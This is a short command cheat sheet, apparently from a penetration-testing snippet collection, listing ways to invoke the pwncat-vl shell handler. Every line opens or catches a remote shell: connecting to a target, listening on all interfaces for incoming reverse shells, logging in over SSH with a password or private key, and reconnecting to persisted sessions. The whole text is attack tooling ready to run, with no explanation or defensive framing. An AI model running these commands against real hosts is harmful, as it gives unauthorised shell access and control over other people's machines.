pwncat-vl connect://$HOST:$(fzf-port)
pwncat-vl $HOST:$(fzf-port)
pwncat-vl $HOST $(fzf-port)

pwncat-vl bind://0.0.0.0:$(fzf-port)
pwncat-vl :$(fzf-port)
pwncat-vl -lp $(fzf-port)

pwncat-vl ssh://$USER:$PASSWORD@$HOST
pwncat-vl $USER@$HOST
pwncat-vl -i id_rsa $USER@$HOST
pwncat-vl -p $(fzf-port) $USER@$HOST

pwncat-vl reconnect://$USER@$HOST
pwncat-vl reconnect://$USER@$SESSION_ID
pwncat-vl :"$(fzf-lport)"
